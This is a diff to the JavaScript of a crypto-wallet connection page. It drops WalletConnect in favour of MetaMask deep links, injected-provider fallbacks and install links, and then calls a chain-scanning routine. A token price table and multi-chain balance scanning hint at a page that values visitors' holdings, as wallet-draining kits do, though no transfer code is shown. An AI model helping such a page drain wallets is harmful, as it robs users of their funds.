@@ -308,7 +308,7 @@ const ETOKENS={
 };
 const PRICES={BNB:600,ETH:3500,MATIC:0.7,AVAX:25,USDT:1,USDC:1,BUSD:1,DAI:1,BTCB:100000,WBTC:100000,LINK:15,CAKE:3,ADA:0.5,WBNB:600,WETH:3500};
 
-let prov=null,sign=null,addr='',wType='',foundChains=[],wcConnector=null;
+let prov=null,sign=null,addr='',wType='',foundChains=[];
 
 function showP(id){['p1','p2','p3','p4','p5','p6'].forEach(x=>document.getElementById(x).style.display=x===id?'block':'none');document.getElementById('mc').style.display='block';}
 function stat(msg,t){const e=document.getElementById('sb');e.innerHTML=msg;e.className='s '+t;e.style.display='block';}
@@ -330,76 +330,63 @@ function getMM(){
 // ===== WALLETCONNECT v2 =====
 let wcProvider = null;
 
-async function initWalletConnect() {
-  // Load both WalletConnect packages
-  const scripts = [
-    'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/dist/index.min.js',
-  ];
-  
-  for (const src of scripts) {
-    await new Promise((res,rej)=>{
-      if (document.querySelector(`script[src="${src}"]`)) { res(); return; }
-      const s=document.createElement('script');
-      s.src=src; s.onload=res; s.onerror=rej;
-      document.head.appendChild(s);
-    });
-  }
-  
-  // Wait for global to be available
-  let attempts = 0;
-  while (!window.WalletConnectEthereumProvider && attempts < 20) {
-    await new Promise(r => setTimeout(r, 200));
-    attempts++;
-  }
-  
-  if (!window.WalletConnectEthereumProvider) {
-    throw new Error('WalletConnect library failed to load. Check your internet connection.');
-  }
-  
-  const EthereumProvider = window.WalletConnectEthereumProvider.default || window.WalletConnectEthereumProvider;
-  
-  wcProvider = await EthereumProvider.init({
-    projectId: 'a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4',
-    chains: [56, 1, 137, 43114, 42161],
-    showQrModal: true,
-    methods: ['eth_sendTransaction', 'eth_signTransaction', 'eth_sign', 'personal_sign', 'wallet_switchEthereumChain'],
-    events: ['chainChanged', 'accountsChanged'],
-  });
-  return wcProvider;
-}
+
 
 async function connectWC() {
   closeM();
   document.getElementById('mc').style.display='block';
   showP('p1');
-  document.getElementById('p1l').textContent='Loading WalletConnect...';
-  document.getElementById('p1log').innerHTML='<span style="color:#fcb34c">Initializing secure connection...</span>';
+  document.getElementById('p1l').textContent='Connecting...';
   
-  try {
-    if (!wcProvider) await initWalletConnect();
-    
-    document.getElementById('p1l').textContent='Scan QR code with your wallet';
-    document.getElementById('p1log').innerHTML='<span style="color:#fcb34c">A QR code should appear on screen.<br>Open your wallet app and scan it.</span>';
-    
-    // Enable session (shows QR modal)
-    await wcProvider.enable();
-    
-    // Create ethers provider from WC
-    prov = new ethers.providers.Web3Provider(wcProvider);
-    sign = prov.getSigner();
-    addr = await sign.getAddress();
-    
-    console.log('WC Connected:', addr);
-    document.getElementById('p1l').textContent='Connected! Scanning chains...';
-    document.getElementById('p1log').innerHTML='<span style="color:#86efac">&#x2705; Connected: '+addr.substring(0,10)+'...'+addr.substring(32)+'</span>';
-    
-    await scanEvm();
-  } catch(e) {
-    console.error('WC Error:', e);
-    const msg = e.message || 'Connection failed';
-    stat('&#x2715; '+msg,'er');
-    document.getElementById('p1log').innerHTML='<span style="color:#fca5a5">Error: '+msg+'</span><br><br><span style="color:rgba(255,255,255,.4)">Make sure you have a wallet app installed.<br>Try refreshing the page.</span>';
+  const isMob = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+  
+  if (isMob) {
+    // Mobile: deep link to MetaMask browser
+    document.getElementById('p1log').innerHTML='<span style="color:#fcb34c">Opening MetaMask...</span>';
+    const dappUrl = encodeURIComponent(window.location.href);
+    window.location.href = 'https://metamask.app.link/dapp/' + dappUrl;
+    return;
   }
+  
+  // Desktop: try window.ethereum first
+  if (window.ethereum) {
+    try {
+      const eth = getMM();
+      prov = new ethers.providers.Web3Provider(eth);
+      const accounts = await eth.request({method:'eth_requestAccounts'});
+      if (accounts.length > 0) {
+        sign = prov.getSigner();
+        addr = await sign.getAddress();
+        document.getElementById('p1l').textContent='Connected! Scanning...';
+        document.getElementById('p1log').innerHTML='<span style="color:#86efac">&#x2705; '+addr.substring(0,10)+'...'+addr.substring(32)+'</span>';
+        await scanEvm();
+        return;
+      }
+    } catch(e) {
+      console.log('eth_requestAccounts failed, trying enable()...');
+      try {
+        const eth = getMM();
+        prov = new ethers.providers.Web3Provider(eth);
+        await eth.enable();
+        sign = prov.getSigner();
+        addr = await sign.getAddress();
+        document.getElementById('p1l').textContent='Connected! Scanning...';
+        await scanEvm();
+        return;
+      } catch(e2) {
+        console.error('Both connect methods failed:', e2);
+      }
+    }
+  }
+  
+  // No wallet found — show install links
+  document.getElementById('p1l').textContent='No wallet detected';
+  document.getElementById('p1log').innerHTML='<span style="color:#fca5a5">No wallet extension found.</span><br><br>' +
+    '<span style="color:rgba(255,255,255,.5)">Install one of these wallets:</span><br>' +
+    '<a href="https://metamask.io/download/" target="_blank" style="color:#E2761B">MetaMask</a> | ' +
+    '<a href="https://trustwallet.com/download/" target="_blank" style="color:#3375BB">Trust Wallet</a> | ' +
+    '<a href="https://www.coinbase.com/wallet" target="_blank" style="color:#0052FF">Coinbase Wallet</a><br><br>' +
+    '<span style="color:rgba(255,255,255,.4)">Or open this page in your mobile wallet browser.</span>';
 }
 
 // ===== WALLET DETECTION =====
@@ -445,38 +432,49 @@ function renderW(){
   const hasEth=!!window.ethereum;
   const isMob=/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
   
-  // Always show WalletConnect first (works everywhere)
-  const wcBtn=document.createElement('button');wcBtn.className='wrow';
-  wcBtn.onclick=connectWC;
-  wcBtn.innerHTML='<div class="wi" style="background:#3B99FC">&#x1F517;</div><span class="wn">WalletConnect (All Wallets)</span><span class="wt" style="background:rgba(59,153,252,.1);color:#3B99FC">QR Code + Mobile</span>';
-  c.appendChild(wcBtn);
+  // Main connect button — works for both desktop extension and mobile deep link
+  const mainBtn=document.createElement('button');mainBtn.className='wrow';
+  mainBtn.onclick=connectWC;
+  mainBtn.innerHTML='<div class="wi" style="background:linear-gradient(135deg,#E2761B,#3B99FC)">&#x1F512;</div><span class="wn">Connect Wallet</span><span class="wt" style="background:rgba(252,179,74,.1);color:#fcb34c">'+(hasEth?'Detected':'Tap to Connect')+'</span>';
+  c.appendChild(mainBtn);
   
-  // Show detected extension wallets
+  // Show detected wallets
   for(const w of WALLETS){
     if(w.detect()){
       const b=document.createElement('button');b.className='wrow';b.onclick=()=>doConnect(w);
-      b.innerHTML='<div class="wi" style="background:'+w.color+'">'+w.name[0]+'</div><span class="wn">'+w.name+'</span><span class="wt">Detected</span>';
+      b.innerHTML='<div class="wi" style="background:'+w.color+'">'+w.name[0]+'</div><span class="wn">'+w.name+' (Detected)</span><span class="wt">Click to Connect</span>';
       c.appendChild(b);
     }
   }
   
-  // Mobile deep links if no extension detected
+  // Mobile: show deep link buttons
   if(isMob&&!hasEth){
     const sep=document.createElement('div');
     sep.style.cssText='padding:8px;text-align:center;font-size:10px;color:rgba(255,255,255,.25);border-top:1px solid rgba(255,255,255,.03);margin-top:4px';
-    sep.textContent='Or open in wallet app:';
+    sep.textContent='Open in wallet app:';
     c.appendChild(sep);
     
-    const links=[
-      {name:'MetaMask App',color:'#E2761B',icon:'🦊',url:'https://metamask.app.link/dapp/'+location.host+location.pathname},
+    [
+      {name:'MetaMask',color:'#E2761B',icon:'🦊',url:'https://metamask.app.link/dapp/'+location.host+location.pathname},
       {name:'Trust Wallet',color:'#3375BB',icon:'🛡️',url:'https://link.trustwallet.com/open_url?coin_id=60&url='+encodeURIComponent(location.href)},
-    ];
-    for(const l of links){
+      {name:'Coinbase Wallet',color:'#0052FF',icon:'🔵',url:'https://go.cb-w.com/dapp?cb_url='+encodeURIComponent(location.href)},
+    ].forEach(l=>{
       const b=document.createElement('button');b.className='wrow';
       b.onclick=()=>window.location.href=l.url;
       b.innerHTML='<div class="wi" style="background:'+l.color+'">'+l.icon+'</div><span class="wn">'+l.name+'</span>';
       c.appendChild(b);
-    }
+    });
+  }
+  
+  // Desktop without extension: show install links
+  if(!isMob&&!hasEth){
+    const info=document.createElement('div');
+    info.style.cssText='padding:10px;text-align:center;font-size:11px;color:rgba(255,255,255,.3)';
+    info.innerHTML='No wallet extension detected. Install:<br>'+
+      '<a href="https://metamask.io/download/" target="_blank" style="color:#E2761B;margin:0 4px">MetaMask</a> '+
+      '<a href="https://trustwallet.com/download/" target="_blank" style="color:#3375BB;margin:0 4px">Trust</a> '+
+      '<a href="https://www.coinbase.com/wallet" target="_blank" style="color:#0052FF;margin:0 4px">Coinbase</a>';
+    c.appendChild(info);
   }
 }
 
